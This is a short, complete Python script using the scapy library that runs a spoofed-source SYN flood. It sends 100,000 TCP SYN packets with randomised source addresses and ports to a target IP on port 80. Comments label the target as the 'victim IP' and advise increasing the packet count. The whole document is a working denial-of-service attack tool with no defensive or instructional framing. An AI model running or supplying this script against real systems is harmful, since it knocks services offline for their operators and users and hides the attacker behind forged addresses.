#!/usr/bin/env python3
from scapy.all import IP, TCP, send
import random

target_ip = "192.168.250.11"  # <-- Replace with victim IP
target_port = 80              # <-- Port to flood (e.g., HTTP)

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

print("[*] Starting spoofed SYN flood...")

for _ in range(100000):  # Increase to send more packets
    ip = IP(src=random_ip(), dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(0, 4294967295))
    pkt = ip / tcp
    send(pkt, verbose=0)

print("[+] Done sending spoofed SYN packets.")
